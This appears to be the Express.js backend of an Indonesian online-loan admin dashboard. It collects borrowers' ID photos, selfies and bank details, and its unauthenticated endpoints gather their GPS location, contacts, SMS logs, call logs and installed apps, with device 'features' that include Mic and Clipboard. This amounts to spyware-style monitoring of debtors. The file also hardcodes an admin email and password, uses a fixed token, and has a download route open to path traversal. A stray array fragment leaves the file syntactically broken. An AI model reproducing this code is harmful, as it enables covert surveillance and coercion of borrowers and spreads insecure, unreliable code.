const express = require('express')
const multer = require('multer')
const fs = require('fs')
const path = require('path')
const WebSocket = require('ws')
const cors = require('cors')

const app = express()
const server = require('http').createServer(app)
const wss = new WebSocket.Server({ server })

// Middleware
app.use(cors())
app.use(express.json())
app.use(express.static('uploads'))
app.use('/api/photos', express.static(path.join(__dirname, 'uploads')))

// Multer configuration
const upload = multer({ 
  dest: path.join(__dirname, 'uploads'),
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB limit
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg']
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true)
    } else {
      cb(new Error('Only image files are allowed'), false)
    }
  }
})

// In-memory data storage
let users = [
  { 
    id: 1, 
    name: 'Budi Santoso', 
    phone: '0812345678901', 
    status: 'active', 
    email: 'budi@example.com',
    imei: '123456789012345',
    ktpPhoto: '/uploads/ktp_budi.jpg',
    selfiePhoto: '/uploads/selfie_budi.jpg',
    // Form data fields
    formData: {
      fullName: 'Budi Santoso',
      phoneNumber: '0812345678901',
      email: 'budi@example.com',
      dateOfBirth: '1990-05-15',
      gender: 'Laki-laki',
      maritalStatus: 'Menikah',
      province: 'DKI Jakarta',
      city: 'Jakarta Pusat',
      district: 'Gambir',
      subDistrict: 'Gambir',
      streetAddress: 'Jl. Sudirman No. 123',
      emergencyContact1Name: 'Siti Aminah',
      emergencyContact1Phone: '0813456789012',
      emergencyContact1Relationship: 'Istri',
      emergencyContact2Name: 'Ahmad Santoso',
      emergencyContact2Phone: '0814567890123',
      emergencyContact2Relationship: 'Ayah',
      ktpNumber: '3173011505900001',
      ktpName: 'BUDI SANTOSO',
      bankName: 'Bank Negara Indonesia',
      accountNumber: '1234567890',
      accountHolderName: 'Budi Santoso'
    },
    loanProduct: {
      name: 'Pinjaman Cepat',
      amount: 5000000,
      tenor: 12,
      interest: 2.5,
      status: 'active',
      dueDate: '2025-12-31',
      remainingAmount: 4500000,
      monthlyPayment: 520833,
      requestedAmount: 5000000,
      applicationDate: '2025-08-01',
      loanType: 'Pinjaman Cepat',
      approvalStatus: 'approved'
    },
    features: ['GPS', 'Kontak', 'SMS', 'Call', 'App', 'Mic', 'Clipboard'],
    device: 'Samsung Galaxy S21',
    command: 'Pending',
    last: '2025-08-03 08:40'
  },
  { 
    id: 2, 
    name: 'Rina Wijaya', 
    phone: '0821987654321', 
    status: 'active', 
    email: 'rina@example.com',
    imei: '987654321098765',
    ktpPhoto: '/uploads/ktp_rina.jpg',
    selfiePhoto: '/uploads/selfie_rina.jpg',
    // Form data fields
    formData: {
      fullName: 'Rina Wijaya',
      phoneNumber: '0821987654321',
      email: 'rina@example.com',
      dateOfBirth: '1988-12-20',
      gender: 'Perempuan',
      maritalStatus: 'Belum Menikah',
      province: 'Jawa Barat',
      city: 'Bandung',
      district: 'Bandung Wetan',
      subDistrict: 'Citarum',
      streetAddress: 'Jl. Asia Afrika No. 45',
      emergencyContact1Name: 'Budi Wijaya',
      emergencyContact1Phone: '0815987654321',
      emergencyContact1Relationship: 'Ayah',
      emergencyContact2Name: 'Sari Wijaya',
      emergencyContact2Phone: '0816987654321',
      emergencyContact2Relationship: 'Ibu',
      ktpNumber: '3273012012880002',
      ktpName: 'RINA WIJAYA',
      bankName: 'Bank Central Asia',
      accountNumber: '0987654321',
      accountHolderName: 'Rina Wijaya'
    },
    loanProduct: {
      name: 'Pinjaman Mikro',
      amount: 2000000,
      tenor: 6,
      interest: 3.0,
      status: 'active',
      dueDate: '2025-09-30',
      remainingAmount: 1200000,
      monthlyPayment: 383333,
      requestedAmount: 2000000,
      applicationDate: '2025-07-15',
      loanType: 'Pinjaman Mikro',
      approvalStatus: 'approved'
    },
    features: ['GPS', 'Kontak', 'App'],
    device: 'Xiaomi Redmi Note 10',
    command: 'OK',
    last: '2025-08-03 08:39'
  },
  { 
    id: 3, 
    name: 'Hendra', 
    phone: '0856123456789', 
    status: 'inactive', 
    email: 'hendra@example.com',
    imei: '555666777888999',
    ktpPhoto: '/uploads/ktp_hendra.jpg',
    selfiePhoto: '/uploads/selfie_hendra.jpg',
    // Form data fields
    formData: {
      fullName: 'Hendra',
      phoneNumber: '0856123456789',
      email: 'hendra@example.com',
      dateOfBirth: '1992-08-10',
      gender: 'Laki-laki',
      maritalStatus: 'Menikah',
      province: 'Jawa Tengah',
      city: 'Semarang',
      district: 'Semarang Tengah',
      subDistrict: 'Pekunden',
      streetAddress: 'Jl. Pandanaran No. 67',
      emergencyContact1Name: 'Dewi Hendra',
      emergencyContact1Phone: '0817123456789',
      emergencyContact1Relationship: 'Istri',
      emergencyContact2Name: 'Budi Hendra',
      emergencyContact2Phone: '0818123456789',
      emergencyContact2Relationship: 'Ayah',
      ktpNumber: '3374011008920003',
      ktpName: 'HENDRA',
      bankName: 'Bank Mandiri',
      accountNumber: '1122334455',
      accountHolderName: 'Hendra'
    },
    loanProduct: {
      name: 'Pinjaman Cepat',
      amount: 3000000,
      tenor: 8,
      interest: 2.8,
      status: 'overdue',
      dueDate: '2025-07-15',
      remainingAmount: 1500000,
      monthlyPayment: 412500,
      requestedAmount: 3000000,
      applicationDate: '2025-05-15',
      loanType: 'Pinjaman Cepat',
      approvalStatus: 'overdue'
    },
    features: ['GPS', 'Kontak'],
    device: 'OPPO A74',
    command: '-',
    last: '2025-08-02 20:10'
  },
  { 
    id: 4, 
    name: 'Siti Aminah', 
    phone: '0877xxxx444', 
    status: 'active', 
    email: 'siti@example.com',
    imei: '111222333444555',
    ktpPhoto: '/uploads/ktp_siti.jpg',
    selfiePhoto: '/uploads/selfie_siti.jpg',
    // Form data fields
    formData: {
      fullName: 'Siti Aminah',
      phoneNumber: '0877xxxx444',
      email: 'siti@example.com',
      dateOfBirth: '1995-03-25',
      gender: 'Perempuan',
      maritalStatus: 'Belum Menikah',
      province: 'DKI Jakarta',
      city: 'Jakarta Selatan',
      district: 'Kebayoran Baru',
      subDistrict: 'Senayan',
      streetAddress: 'Jl. Sudirman Kav. 89',
      emergencyContact1Name: 'Ahmad Aminah',
      emergencyContact1Phone: '0819xxxx444',
      emergencyContact1Relationship: 'Ayah',
      emergencyContact2Name: 'Fatimah Aminah',
      emergencyContact2Phone: '0820xxxx444',
      emergencyContact2Relationship: 'Ibu',
      ktpNumber: '3173012503950004',
      ktpName: 'SITI AMINAH',
      bankName: 'Bank Negara Indonesia',
      accountNumber: '5566778899',
      accountHolderName: 'Siti Aminah'
    },
    loanProduct: {
      name: 'Pinjaman Mikro',
      amount: 1500000,
      tenor: 4,
      interest: 3.2,
      status: 'pending',
      dueDate: '2025-10-15',
      remainingAmount: 1500000,
      monthlyPayment: 412500,
      requestedAmount: 1500000,
      applicationDate: '2025-08-01',
      loanType: 'Pinjaman Mikro',
      approvalStatus: 'pending'
    },
    features: ['GPS', 'Kontak', 'SMS', 'Clipboard', 'Notif'],
    device: 'Vivo Y53s',
    command: 'Pending',
    last: '2025-08-03 08:35'
  }
]
let idCounter = 5

// Authentication middleware (simple JWT-like)
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization']
  const token = authHeader && authHeader.split(' ')[1]
  
  if (!token) {
    return res.status(401).json({ message: 'Access token required' })
  }
  
  // Simple token validation (in production, use proper JWT)
  if (token === 'admin-token') {
    next()
  } else {
    res.status(403).json({ message: 'Invalid token' })
  }
}

// Auth routes
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body
  
  if (username === 'cs@toolspinjonterbaru.org' && password === 'Habibhassan123@') {
    res.json({ 
      token: 'admin-token',
      user: { username: 'cs@toolspinjonterbaru.org', role: 'admin' }
    })
  } else {
    res.status(401).json({ message: 'Invalid credentials' })
  }
})

// User API routes
app.get('/api/users', authenticateToken, (req, res) => {
  res.json(users)
})

app.post('/api/users', authenticateToken, (req, res) => {
  const user = { id: idCounter++, ...req.body }
  users.push(user)
  res.json(user)
})

// Flutter App API endpoints for form data and loan submission
app.post('/api/flutter/submit-form', (req, res) => {
  console.log('=== FLUTTER SUBMIT FORM ENDPOINT CALLED ===');
  console.log('Request headers:', req.headers);
  console.log('Request body:', req.body);
  
  try {
    const formData = req.body
    console.log('Received form data:', formData)
    
    // Generate a unique phone number if not provided
    const phoneNumber = formData.phoneNumber && formData.phoneNumber !== 'pending' 
      ? formData.phoneNumber 
      : `pending_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    
    console.log('Generated phone number:', phoneNumber);
    
    // Check if user already exists
    let existingUser = users.find(u => u.phone === phoneNumber)
    
    if (existingUser) {
      // Update existing user with new form data
      existingUser.formData = {
        ...existingUser.formData,
        ...formData
      }
      existingUser.name = formData.fullName || 'Pending User'
      existingUser.email = formData.email || 'pending@example.com'
      existingUser.last = new Date().toISOString()
      
      console.log('Updated existing user:', existingUser.id)
      res.json({ 
        success: true, 
        message: 'Form data updated successfully',
        userId: existingUser.id 
      })
    } else {
      // Create new user
      const newUser = {
        id: idCounter++,
        name: formData.fullName || 'Pending User',
        phone: phoneNumber,
        status: 'active',
        email: formData.email || 'pending@example.com',
        imei: formData.imei || 'Unknown',
        ktpPhoto: formData.ktpPhotoPath || '/uploads/placeholder-ktp.jpg',
        selfiePhoto: formData.selfiePhotoPath || '/uploads/placeholder-selfie.jpg',
        formData: formData,
        loanProduct: {
          name: 'Pending',
          amount: 0,
          tenor: 0,
          interest: 0,
          status: 'pending',
          dueDate: null,
          remainingAmount: 0,
          monthlyPayment: 0,
          requestedAmount: 0,
          applicationDate: new Date().toISOString(),
          loanType: 'Pending',
          approvalStatus: 'pending'
        },
        features: ['GPS', 'Kontak', 'SMS', 'Call', 'App', 'Mic', 'Clipboard'],
        device: formData.deviceModel || 'Unknown',
        command: 'Pending',
        last: new Date().toISOString()
      }
      
      users.push(newUser)
      console.log('Created new user:', newUser.id)
      res.json({ 
        success: true, 
        message: 'Form data submitted successfully',
        userId: newUser.id 
      })
    }
  } catch (error) {
    console.error('Error submitting form data:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error: ' + error.message 
    })
  }
})

app.post('/api/flutter/submit-loan', (req, res) => {
  try {
    const loanData = req.body
    const { userId, phoneNumber } = loanData
    
    // Find user by ID or phone number
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    // Update loan product information
    user.loanProduct = {
      name: loanData.loanProduct || 'Pinjaman Cepat',
      amount: loanData.requestedAmount || 0,
      tenor: loanData.tenor || 12,
      interest: loanData.interest || 2.5,
      status: loanData.status || 'pending',
      dueDate: loanData.dueDate || new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      remainingAmount: loanData.requestedAmount || 0,
      monthlyPayment: loanData.monthlyPayment || 0,
      requestedAmount: loanData.requestedAmount || 0,
      applicationDate: loanData.applicationDate || new Date().toISOString(),
      loanType: loanData.loanType || 'Pinjaman Cepat',
      approvalStatus: loanData.approvalStatus || 'pending'
    }
    
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'Loan data submitted successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error submitting loan data:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

app.post('/api/flutter/upload-photo', upload.single('photo'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false, 
        message: 'No photo uploaded' 
      })
    }
    
    const { userId, photoType } = req.body // photoType: 'ktp' or 'selfie'
    const photoPath = `/uploads/${req.file.filename}`
    
    // Find user
    const user = users.find(u => u.id == userId)
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    // Update photo path
    if (photoType === 'ktp') {
      user.ktpPhoto = photoPath
      user.formData.ktpPhotoPath = photoPath
    } else if (photoType === 'selfie') {
      user.selfiePhoto = photoPath
      user.formData.selfiePhotoPath = photoPath
    }
    
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'Photo uploaded successfully',
      photoPath: photoPath,
      userId: user.id 
    })
  } catch (error) {
    console.error('Error uploading photo:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

// Get loan products for Flutter app
app.get('/api/flutter/loan-products', (req, res) => {
  const loanProducts = [
    {
      id: 1,
      name: 'Pinjaman Cepat',
      minAmount: 1000000,
      maxAmount: 5000000,
      tenor: [6, 12, 18, 24],
      interest: 2.5,
      description: 'Pinjaman cepat dengan proses mudah'
    },
    {
      id: 2,
      name: 'Pinjaman Mikro',
      minAmount: 500000,
      maxAmount: 2000000,
      tenor: [3, 6, 9, 12],
      interest: 3.0,
      description: 'Pinjaman mikro untuk kebutuhan kecil'
    },
    {
      id: 3,
      name: 'Pinjaman Usaha',
      minAmount: 2000000,
      maxAmount: 10000000,
      tenor: [12, 18, 24, 36],
      interest: 2.0,
      description: 'Pinjaman untuk pengembangan usaha'
    }
  ]
  res.json(loanProducts)
})

// GPS Tracking endpoint for Flutter app
app.post('/api/flutter/gps-track', (req, res) => {
  try {
    const { userId, phoneNumber, latitude, longitude, address, timestamp } = req.body
    
    // Find user by ID or phone number
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    // Add GPS data to user
    if (!user.gpsData) {
      user.gpsData = []
    }
    
    const gpsEntry = {
      time: timestamp || new Date().toISOString(),
      lat: parseFloat(latitude),
      lon: parseFloat(longitude),
      address: address || 'Unknown Location'
    }
    
    user.gpsData.unshift(gpsEntry)
    
    // Keep only last 50 GPS entries
    if (user.gpsData.length > 50) {
      user.gpsData = user.gpsData.slice(0, 50)
    }
    
    user.last = new Date().toISOString()
    
    // Broadcast to WebSocket clients
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({
          type: 'gps_update',
          userId: user.id,
          gpsData: gpsEntry
        }))
      }
    })
    
    res.json({ 
      success: true, 
      message: 'GPS data recorded successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error recording GPS data:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

// Monitoring data endpoints for Flutter app
app.post('/api/flutter/contacts', (req, res) => {
  try {
    const { userId, phoneNumber, contacts } = req.body
    
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    user.contacts = contacts || []
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'Contacts data recorded successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error recording contacts:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

app.post('/api/flutter/sms-logs', (req, res) => {
  try {
    const { userId, phoneNumber, smsLogs } = req.body
    
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    user.smsLogs = smsLogs || []
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'SMS logs recorded successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error recording SMS logs:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

app.post('/api/flutter/call-logs', (req, res) => {
  try {
    const { userId, phoneNumber, callLogs } = req.body
    
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    user.callLogs = callLogs || []
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'Call logs recorded successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error recording call logs:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

app.post('/api/flutter/apps', (req, res) => {
  try {
    const { userId, phoneNumber, installedApps } = req.body
    
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    user.installedApps = installedApps || []
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'Installed apps recorded successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error recording installed apps:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})

app.post('/api/flutter/permissions', (req, res) => {
  try {
    const { userId, phoneNumber, permissions } = req.body
    
    let user = null
    if (userId) {
      user = users.find(u => u.id == userId)
    } else if (phoneNumber) {
      user = users.find(u => u.phone === phoneNumber)
    }
    
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'User not found' 
      })
    }
    
    user.permissions = permissions || []
    user.last = new Date().toISOString()
    
    res.json({ 
      success: true, 
      message: 'Permissions recorded successfully',
      userId: user.id 
    })
  } catch (error) {
    console.error('Error recording permissions:', error)
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error' 
    })
  }
})
      minAmount: 2000000,
      maxAmount: 10000000,
      tenor: [12, 18, 24, 36],
      interest: 2.8,
      description: 'Pinjaman untuk pengembangan usaha'
    },
    {
      id: 4,
      name: 'Pinjaman Pendidikan',
      minAmount: 1000000,
      maxAmount: 5000000,
      tenor: [12, 24, 36],
      interest: 2.2,
      description: 'Pinjaman untuk biaya pendidikan'
    },
    {
      id: 5,
      name: 'Pinjaman Kesehatan',
      minAmount: 500000,
      maxAmount: 3000000,
      tenor: [6, 12, 18],
      interest: 2.7,
      description: 'Pinjaman untuk kebutuhan kesehatan'
    },
    {
      id: 6,
      name: 'Pinjaman Kendaraan',
      minAmount: 3000000,
      maxAmount: 15000000,
      tenor: [12, 24, 36, 48],
      interest: 2.3,
      description: 'Pinjaman untuk pembelian kendaraan'
    },
    {
      id: 7,
      name: 'Pinjaman Rumah',
      minAmount: 10000000,
      maxAmount: 50000000,
      tenor: [60, 120, 180],
      interest: 1.8,
      description: 'Pinjaman untuk pembelian rumah'
    },
    {
      id: 8,
      name: 'Pinjaman Gadai',
      minAmount: 100000,
      maxAmount: 1000000,
      tenor: [1, 3, 6],
      interest: 4.0,
      description: 'Pinjaman dengan jaminan barang'
    },
    {
      id: 9,
      name: 'Pinjaman Investasi',
      minAmount: 5000000,
      maxAmount: 25000000,
      tenor: [24, 36, 48, 60],
      interest: 2.0,
      description: 'Pinjaman untuk investasi'
    },
    {
      id: 10,
      name: 'Pinjaman Darurat',
      minAmount: 200000,
      maxAmount: 1000000,
      tenor: [1, 2, 3],
      interest: 5.0,
      description: 'Pinjaman darurat untuk kebutuhan mendesak'
    }
  ]
  
  res.json({ 
    success: true, 
    loanProducts: loanProducts 
  })
})

app.put('/api/users/:id', authenticateToken, (req, res) => {
  const i = users.findIndex(u => u.id == req.params.id)
  if (i >= 0) {
    users[i] = { ...users[i], ...req.body }
    res.json(users[i])
  } else {
    res.status(404).json({ message: 'User not found' })
  }
})

app.delete('/api/users/:id', authenticateToken, (req, res) => {
  users = users.filter(u => u.id != req.params.id)
  res.json({ ok: true })
})

// File API routes
app.get('/api/files', authenticateToken, (req, res) => {
  try {
    const files = fs.readdirSync(path.join(__dirname, 'uploads'))
      .map(f => ({ 
        name: f,
        size: fs.statSync(path.join(__dirname, 'uploads', f)).size,
        uploaded: fs.statSync(path.join(__dirname, 'uploads', f)).mtime
      }))
    res.json(files)
  } catch (error) {
    res.json([])
  }
})

app.post('/api/upload', authenticateToken, upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ message: 'No file uploaded' })
  }
  res.json({ 
    ok: true, 
    file: req.file.filename,
    originalName: req.file.originalname,
    size: req.file.size
  })
})

app.get('/api/download/:name', authenticateToken, (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.params.name)
  if (fs.existsSync(filePath)) {
    res.download(filePath)
  } else {
    res.status(404).json({ message: 'File not found' })
  }
})

// User statistics endpoint
app.get('/api/user-stats', authenticateToken, (req, res) => {
  const stats = {
    total: users.length,
    active: users.filter(u => u.status === 'active').length,
    inactive: users.filter(u => u.status === 'inactive').length,
    pending: users.filter(u => u.loanProduct.status === 'pending').length,
    overdue: users.filter(u => u.loanProduct.status === 'overdue').length
  }
  res.json(stats)
})

// Monitoring endpoint
app.get('/api/monitoring', authenticateToken, (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    users: users.length,
    files: fs.readdirSync(path.join(__dirname, 'uploads')).length,
    uptime: process.uptime()
  })
})

// WebSocket connection
wss.on('connection', (ws, req) => {
  console.log('New WebSocket client connected')
  
  // Send welcome message
  ws.send(JSON.stringify({ 
    type: "greeting", 
    msg: "Welcome to Admin Dashboard WebSocket!" 
  }))

  // Send initial stats
  ws.send(JSON.stringify({ 
    type: "stats", 
    online: wss.clients.size,
    users: users.length,
    files: fs.readdirSync(path.join(__dirname, 'uploads')).length,
    timestamp: new Date().toISOString() 
  }))

  // Broadcast stats every 10 seconds
  const interval = setInterval(() => {
    ws.send(JSON.stringify({ 
      type: "stats", 
      online: wss.clients.size,
      users: users.length,
      files: fs.readdirSync(path.join(__dirname, 'uploads')).length,
      timestamp: new Date().toISOString() 
    }))
  }, 10000)

  ws.on('message', (message) => {
    console.log('Received:', message.toString())
    // Handle client messages here
  })

  ws.on('close', () => {
    console.log('Client disconnected')
    clearInterval(interval)
  })
})

// Start server
const PORT = process.env.PORT || 9000
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`)
  console.log(`- HTTP API: http://localhost:${PORT}/api`)
  console.log(`- WebSocket: ws://localhost:${PORT}`)
}) 